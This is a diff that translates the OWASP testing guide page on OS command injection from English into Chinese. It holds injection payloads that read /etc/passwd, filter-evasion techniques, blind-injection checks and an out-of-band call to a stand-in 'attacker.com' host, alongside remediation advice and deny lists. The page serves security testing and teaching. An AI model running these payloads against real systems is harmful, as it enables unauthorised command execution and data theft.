@@ -1,43 +1,43 @@
-# Testing for Command Injection
+# 测试命令注入
 
 |ID          |
 |------------|
 |WSTG-INPV-12|
 
-## Summary
+## 概述
 
-This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.
+本文描述如何测试应用程序是否存在OS命令注入。测试人员将尝试通过HTTP请求向应用程序注入OS命令。
 
-OS command injection is a vulnerability that occurs when user input is directly passed to an operating system command without proper validation or sanitization. This allows the user to inject and execute arbitrary commands on the server which can lead to unauthorized data access, data corruption, and full server compromise. This vulnerability can be prevented by emphasizing security during the design and development of applications.
+OS命令注入是当用户输入直接传递给操作系统命令而没有适当验证或清理时发生的漏洞。这允许攻击者注入和执行服务器上的任意命令，可能导致未授权数据访问、数据篡改和完全服务器危害。可以通过在应用程序的设计和开发过程中强调安全性来防止此漏洞。
 
-## Test Objectives
+## 测试目标
 
-- Identify and assess command injection points.
-- Bypass special characters and OS commands filter.
+- 识别和评估命令注入点。
+- 绕过特殊字符和OS命令过滤器。
 
-## How to Test
+## 如何测试
 
-When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol `|` onto the end of the filename.
+当在Web应用程序中查看文件时，文件名通常显示在URL中。Perl允许通过open语句从进程管道传输数据。用户可以简单地将管道符号`|`附加到文件名末尾。
 
-Example URL before alteration:
+更改前的示例URL：
 
 `https://sensitive/cgi-bin/userData.pl?doc=user1.txt`
 
-Example URL modified:
+更改后的示例URL：
 
 `https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`
 
-This will execute the command `/bin/ls`.
+这将执行命令`/bin/ls`。
 
-Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon
+在.PHP页面URL末尾附加分号，后跟操作系统命令，将执行该命令。`%3B`是URL编码的，解码为分号
 
-Example:
+示例：
 
 `https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`
 
-### Example
+### 示例
 
-Consider the case of an application that contains a set of documents that you can browse from the internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):
+考虑一个包含可从互联网浏览的文档的应用程序。如果您启动个人代理（如ZAP或Burp Suite），您可以获得如下POST HTTP（`https://www.example.com/public/doc`）：
 
 ```txt
 POST /public/doc HTTP/1.1
@@ -52,7 +52,7 @@ Content-length: 33
 Doc=Doc1.pdf
 ```
 
-In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (`https://www.example.com/public/doc`):
+在此POST请求中，我们注意到应用程序如何检索公共文档。现在我们可以测试是否可以添加操作系统命令来在POST HTTP中注入。尝试以下操作（`https://www.example.com/public/doc`）：
 
 ```txt
 POST /public/doc HTTP/1.1
@@ -67,7 +67,7 @@ Content-length: 33
 Doc=Doc1.pdf+|+Dir c:\
 ```
 
-If the application doesn't validate the request, we can obtain the following result:
+如果应用程序不验证请求，我们可以获得以下结果：
 
 ```txt
     Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
@@ -84,62 +84,62 @@ If the application doesn't validate the request, we can obtain the following res
            25/10/2006 03:11
               I386
               14/11/2006 18:51
-             h4ck3r
-             30/09/2005 21:40 25,934
-            OWASP1.JPG
-            03/11/2006 18:29
-                Prog
-                18/11/2006 11:20
-                    Program Files
-                    16/11/2006 21:12
-                        Software
-                        24/10/2006 18:25
-                            Setup
-                            24/10/2006 23:37
-                                Technologies
-                                18/11/2006 11:14
-                                3 File 32,496 byte
-                                13 Directory 6,921,269,248 byte disponibili
-                                Return code: 0
+              h4ck3r
+              30/09/2005 21:40 25,934
+              OWASP1.JPG
+              03/11/2006 18:29
+                  Prog
+                  18/11/2006 11:20
+                      Program Files
+                      16/11/2006 21:12
+                          Software
+                          24/10/2006 18:25
+                              Setup
+                              24/10/2006 23:37
+                                  Technologies
+                                  18/11/2006 11:14
+                                  3 File 32,496 byte
+                                  13 Directory 6,921,269,248 byte disponibili
+    Return code: 0
 ```
 
-In this case, we have successfully performed an OS injection attack.
+在这种情况下，我们成功执行了OS注入攻击。
 
-## Special Characters for Command Injection
+## 命令注入的特殊字符
 
-Special characters are used to chain multiple commands together.
-These characters will vary based on the operating system running on the web server.
-For instance, the following types of command chaining can be used on both Windows and Unix-based systems :
+特殊字符用于将多个命令链接在一起。
+这些字符因Web服务器上运行的操作系统而异。
+例如，以下类型的命令链接可用于Windows和基于Unix的系统：
 
-- `cmd1|cmd2` : cmd2 will be executed whether cmd1 succeeds or not.
-- `cmd1||cmd2` : cmd2 will only be executed if cmd1 fails.
-- `cmd1&&cmd2` : cmd2 will only be executed if cmd1 succeeds.
-- `cmd1&cmd2` : cmd2 will be executed whether cmd1 succeeds or not.  
+- `cmd1|cmd2`：无论cmd1成功与否，cmd2都将执行。
+- `cmd1||cmd2`：仅当cmd1失败时，cmd2才执行。
+- `cmd1&&cmd2`：仅当cmd1成功时，cmd2才执行。
+- `cmd1&cmd2`：无论cmd1成功与否，cmd2都将执行。
 
-Note that, `;` will work on Unix-based systems and PowerShell. However, it will not work on Windows Command Prompt (CMD).  
-Furthermore, you can use Bash command substitution `$(cmd)` or &grave;`cmd`&grave; to execute commands on Unix-based systems.  
-Additionally, Linux file descriptors such as `>(cmd)`, `<(cmd)` can also be used.
+注意，`;`适用于Unix系统和PowerShell。但是，它不适用于Windows命令提示符（CMD）。
+此外，您可以使用Bash命令替换`$(cmd)`或`` `cmd` ``在基于Unix的系统上执行命令。
+此外，还可以使用Linux文件描述符，例如`>(cmd)`、`<(cmd)`。
 
-## Additional Command Injection Techniques
+## 其他命令注入技术
 
-Attackers may leverage different techniques to execute operating system commands depending on the environment and filtering mechanisms.
+攻击者可以利用不同技术根据环境 和过滤机制执行操作系统命令。
 
-### Command Substitution
+### 命令替换
 
-Command substitution allows the output of one command to be used as input to another command.
+命令替换允许将一个命令的输出用作另一个命令的输入。
 
-Examples:
+示例：
 
 ```bash
 $(whoami)
 `whoami`
 ```
 
-### Command Chaining
+### 命令链接
 
-Multiple commands can be executed sequentially using command chaining operators.
+可以使用命令链接运算符顺序执行多个命令。
 
-Examples:
+示例：
 
 ```bash
 cmd1 ; cmd2
@@ -147,53 +147,53 @@ cmd1 && cmd2
 cmd1 || cmd2
 ```
 
-### File Redirection
+### 文件重定向
 
-Attackers may redirect command output to files accessible by the web server.
+攻击者可以将命令输出重定向到攻击者可访问的文件。
 
-Example:
+示例：
 
 ```bash
 whoami > /var/www/html/output.txt
 ```
 
-### Out-of-Band Command Injection
+### 带外命令注入
 
-Attackers may use external services to detect command execution.
+攻击者可以使用外部服务检测命令执行。
 
-Examples:
+示例：
 
 ```bash
 curl http://attacker.com
 nslookup attacker.com
 ```
 
-## Filter Evasion
+## 过滤器绕过
 
-To prevent OS command injection, web developers often use filters. However, these filters are sometimes not properly implemented which allows attackers to bypass them.
-In this section, we will cover different techniques used to bypass those filters.
+为了防止OS命令注入，Web开发人员通常使用过滤器。但是，这些过滤器有时没有正确实现，从而允许攻击者绕过它们。
+在本节中，我们将介绍用于绕过这些过滤器的不同技术。
 
-### Methodology
+### 方法论
 
-First of all, it is always good practice to have a basic understanding of how the filter works before trying to bypass it.
-Here is a methodology we can use when we come across a filter:
+首先，了解过滤器的工作原理然后尝试绕过它始终是最佳实践。
+以下是我们遇到过滤器时可以采用的方法：
 
-- Is the filter client-side or server-side ?
-- Is the filter applied on special characters, OS commands, or both ?
-- Is the webapp using a allowlist or blocklist filter ?
-- What OS is running on the web server? This allows us to have an idea of the commands and special characters we can use.
+- 过滤器是客户端还是服务器端？
+- 过滤器应用于特殊字符、操作系统命令还是两者？
+- Web应用程序使用允许列表还是阻止列表过滤器？
+- Web服务器上运行的是什么操作系统？这使我们可以了解可以使用的命令和特殊字符。
 
-### Special Characters Filter Evasion
+### 特殊字符过滤器绕过
 
-As previously mentioned, filters can either be applied on special characters, OS commands or both.
-To bypass filters applied on special characters, we can use environment variables, Bash brace expansion or URL encoding.
+如前所述，过滤器可以应用于特殊字符、操作系统命令或两者。
+要绕过应用于特殊字符的过滤器，我们可以使用环境变量、Bash大括号扩展或URL编码。
 
-#### URL Encoding
+#### URL编码
 
-URL encoding special characters can allow us to bypass the filter if the web server only blocks the plaintext special characters.
-Here are some special characters with their URL encoded format:
+URL编码特殊字符可以让我们绕过过滤器，如果Web服务器仅阻止明文特殊字符。
+以下是一些特殊字符及其URL编码格式：
 
-|Special Character|URL Encoding|
+|特殊字符|URL编码|
 |-----------------|------------|
 |;                | %3b        |
 |space            | %20        |
@@ -201,67 +201,67 @@ Here are some special characters with their URL encoded format:
 |&                | %26        |
 |New line         | %0a        |
 
-For instance, instead of using `;whoami`, we could use `%3bwhoami`.
+例如，不要使用`;whoami`，我们可以使用`%3bwhoami`。
 
-#### Environment Variables
+#### 环境变量
 
-Special characters like space, semi-colon, tab, or new line will generally be filtered by the web server especially if they are not useful for the specified input.  
-To escape this restriction, we can use environment variables such as **IFS**, **PATH** or **LS_COLORS** on Linux, and **HOMEPATH** on Windows.  
-For instance, on Linux, `/`, `;`, and `[space]` can be replaced respectively with `${PATH:0:1}`, `${LS_COLORS:10:1}`, and `${IFS}`.  
-On Windows CMD, we can replace `\` with `%HOMEPATH:~6,1%`, or use `$env:HOMEPATH[0]` in PowerShell.
+空格、分号、制表符或换行符等特殊字符通常会被Web服务器过滤，特别是当它们对指定输入无用时。
+为了逃避这种限制，我们可以使用环境变量，例如Linux上的**IFS**、**PATH**或**LS_COLORS**，以及Windows上的**HOMEPATH**。
+例如，在Linux上，`/`、`;`可以分别替换为`${PATH:0:1}`、`${LS_COLORS:10:1}`和`${IFS}`。
+在Windows CMD上，我们可以用`%HOMEPATH:~6,1%`替换`\`，或在PowerShell中使用`$env:HOMEPATH[0]`。
 
-#### Bash Brace Expansion
+#### Bash大括号扩展
 
-Bash brace expansion is a Bash feature that allows you to execute commands by using curly braces.  
-For example, `{ls,-la}` will execute `ls -la` command. This can be extremely useful if the web server is filtering space, new line, or tab characters.  
-Let's assume that we want to display the content of '/etc/passwd' file. Thus, instead of using `;cat /etc/passwd`, we can use `;{cat,/etc/passwd}`.
-That said, it's important to note that this technique will only work if the web server is using Bash and if characters like `}{/,;` are not filtered.
+Bash大括号扩展是Bash的一项功能，允许您使用大括号执行命令。
+例如，`{ls,-la}`将执行`ls -la`命令。如果Web服务器过滤空格、换行符或制表符，这将非常有用。
+假设我们要显示'/etc/passwd'文件的内容。因此，不要使用`;cat /etc/passwd`，我们可以使用`;{cat,/etc/passwd}`。
+也就是说，重要的是要记住，只有当Web服务器使用Bash且不过滤`}{/`等字符时，此技术才有效。
 
-### Commands Filter Evasion
+### 命令过滤器绕过
 
-In this section, we are going to explore some techniques used to bypass filters applied on operating system commands.
+在本节中，我们将探索一些用于绕过应用于操作系统命令的过滤器的技术。
 
-#### Case Modification
+#### 大小写修改
 
-Case modification is a technique that is used to bypass OS command filters. This will be helpful if the server-side filter is case sensitive.  
-For instance, if we notice during our testing that the web server is blocking `;whoami`, we can try to use instead `;WhoAmi`, and see that the server-side filter is only blocking lowercase commands, we will be able to bypass it.  
-Note that this technique will generally work on Windows systems.  
-On Linux, we will use a technique called **character shifting**. For instance, the command below will translate each uppercase character to its corresponding lowercase character.  
+大小写修改是一种用于绕过OS命令过滤器的技术。如果服务器端过滤器区分大小写，这将有帮助。
+例如，如果我们在测试中注意到Web服务器阻止了`;whoami`，，我们可以尝试使用`;WhoAmI`，并看到服务器端过滤器仅阻止小写命令，我们将能够绕过它。
+请注意，此技术通常适用于Windows系统。
+在Linux上，我们将使用一种称为**字符转换**的技术。例如，以下命令会将每个大写字符转换为其对应的小写字符。
 
 ```bash
 ;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")
 ```
 
-#### Character Insertion
+#### 字符插入
 
-Characters like `\`; `$@`, `'` can be inserted into Linux OS commands without affecting the normal execution of the command.  
-For example, `who\ami`, `w$@hoami` or `wh'o'ami` will all execute the `whoami` command  
+字符`\`; `$@`, `'`可以插入到Linux OS命令中，而不影响命令的正常执行。
+例如，`who\ami`, `w$@hoami`或`wh'o'ami`都将执行`whoami`命令
 
-Note that the number of single quotes `'` in the Linux command must be **even**, otherwise you will get an error. If you're using Windows CMD, make sure to use double quotes `"` instead.  
-Furthermore, you can also use a caret `^` in CMD commands. For example, `whoa^mi` will execute the `whoami` command. This does not work in PowerShell.
+请注意，Linux命令中单引号`'`的数量必须为**偶数**，否则会出现错误。如果使用Windows CMD，请确保使用双引号`"`代替。
+此外，您还可以在CMD命令中使用插入符号`^`。例如，`whoa^mi`将执行`whoami`命令。这在PowerShell中不起作用。
 
-#### Base64 Encoding
+#### Base64编码
 
-In certain scenarios, the web server may filter commands such as `whoami`, `id`, etc.  
-Let's suppose that `whoami` is blocked by the web server. Therefore, we cannot use a payload like `;whoami`.  
-To bypass this restriction, we will use the base64 encoded format of `whoami` by executing: `echo -n 'whoami' | base64`. This will return `d2hvYW1p`.
-After that, we will send the following payload: `;bash<<<$(base64 -d<<< d2hvYW1p)` in the vulnerable parameter. This should then bypass the server-side filter and allow us to achieve remote command execution.
+在某些情况下，Web服务器可能过滤命令，如`whoami`、`id`等。
+假设`whoami`被Web服务器阻止。因此，我们不能使用`;whoami`之类的有效载荷。
+为了绕过此限制，我们将使用`whoami`的base64编码格式：`echo -n 'whoami' | base64`执行。这将返回`d2hvYW1p`。
+然后，我们将发送以下有效载荷：`;bash<<<$(base64 -d<<< d2hvYW1p)`在易受攻击的参数中。这应该能够绕过服务器端过滤器并允许我们实现远程命令执行。
 
-**Finally, note that you may need to combine different special characters and OS command filter evasion techniques to successfully bypass the filters put in place by the web server.**
+**最后，请注意，您可能需要组合不同的特殊字符和OS命令过滤器绕过技术，以成功绕过Web服务器设置的过滤器。**
 
-## Blind Command Injection
+## 盲命令注入
 
-Sometimes, we may not be able to see the output from our injected command in the web server's HTTP response. Thus, we will need to find a way to confirm whether or not our injection succeeded. To do that, we can use `HTTP`, `DNS`, or `SMTP` remote servers under our control.  
-We can also use **time delay system commands** like `sleep` (Linux), `timeout` (Windows), or network utility like `ping`.  
-For instance, we can execute `;sleep(5)` and if the web server waits 5 seconds before sending a response back to us, we can confirm that it is vulnerable to a blind command injection.  
-Moreover, we can also **redirect the output of the injected command in the web server's web root**. `;whoami>/var/www/html/poc.txt;`  
-After that, we can execute `curl http://website.com/poc.txt`. If we are able to retrieve the file, we can then confirm that the web server is vulnerable to a blind command injection.
+有时，我们可能无法在Web服务器的HTTP响应中看到注入命令的输出。因此，我们需要找到一种方法确认我们的注入是否成功。为此，我们可以使用HTTP、DNS或SMTP远程服务器（在我们控制下）。
+我们还可以使用**时间延迟系统命令**，如Linux上的`sleep`、Windows上的`timeout`，或网络实用程序如`ping`。
+例如，我们可以执行`;sleep(5)`，如果Web服务器在向我们返回响应之前等待5秒，我们就可以确认它容易受到盲命令注入。
+此外，我们还可以**将注入命令的输出重定向到Web服务器的Web根目录**。`;whoami>/var/www/html/poc.txt;`
+之后，我们可以执行`curl http://website.com/poc.txt`。如果我们能够检索文件，那么就可以确认Web服务器容易受到盲命令注入。
 
-## Dangerous Command Execution APIs
+## 危险的命令执行API
 
-The following APIs in different programming languages can execute operating system commands and may introduce command injection vulnerabilities if used with unsanitized user input.
+以下不同编程语言中的API可以执行操作系统命令，如果与未清理的用户输入一起使用，可能会引入命令注入漏洞。
 
-| Language | Dangerous APIs |
+| 语言 | 危险API |
 |---------|---------------|
 | Java | `Runtime.exec()` |
 | C/C++ | `system()`, `exec()`, `ShellExecute()` |
@@ -272,34 +272,34 @@ The following APIs in different programming languages can execute operating syst
 | Go | `exec.Command()` |
 | C# | `Process.Start()` |
 
-## Remediation
+## 修复
 
-### Sanitization
+### 清理
 
-The URL query parameters and form data need to be validated and sanitized to prevent the injection of malicious characters.  
-A blocklist of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet.  
-A allowlist containing only authorized characters or commands should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.  
+URL查询参数和表单数据需要验证和清理，以防止注入恶意字符。
+字符阻止列表是一种选择，但可能难以考虑所有要验证的字符。也可能有一些尚未发现的字符。
+应创建仅包含授权字符或命令的允许列表来验证用户输入。允许列表将消除遗漏的字符以及未发现的威胁。
 
-General deny list to be included for command injection can be `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`  
+命令注入的通用拒绝列表包括`` `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#` ``
 
-Escape or filter special characters for windows, `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```  
+Windows的转义或过滤特殊字符，`(` `)` `<` `>` `&` `*` `'` `|` `=` `?` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```
 
-Escape or filter special characters for Linux, `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```  
+Linux的转义或过滤特殊字符，`{` `}` `(` `)` `>` `<` `&` `*` `'` `|` `=` `?` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%` `/` `\` `:` `+` `,`  ``` ` ```
 
-Moreover, avoid using functions that execute operating system commands in your application unless absolutely necessary. For instance, instead of using `system("cp /path/to/file1.txt /path/to/file2.txt")` to copy a file, you can directly use the php built-in function `copy("cp /path/to/file1.txt, /path/to/file2.txt")` which does exactly the same thing. It's worth noting that other development languages/frameworks generally offer similar built-in functionality.
+此外，避免在应用程序中使用执行操作系统命令的函数，除非绝对必要。例如，不要使用`system("cp /path/to/file1.txt /path/to/file2.txt")`来复制文件，您可以直接使用PHP内置函数`copy("cp /path/to/file1.txt, /path/to/file2.txt")`，其作用完全相同。请注意，其他开发语言/框架通常提供类似的内置功能。
 
-### Permissions
+### 权限
 
-The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.
+Web应用程序及其组件应以不允许操作系统命令执行的严格权限运行。尝试从灰盒测试角度验证所有这些信息。
 
-## Tools
+## 工具
 
 - OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
 - [Commix](https://github.com/commixproject/commix)
 - [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
 - [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 
-## References
+## 参考资料
 
-- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
-- [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)
+- [CWE-78：操作系统命令中特殊元素的不当中和（"OS命令注入"）](https://cwe.mitre.org/data/definitions/78.html)
+- [ENV33-C。不要调用system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)
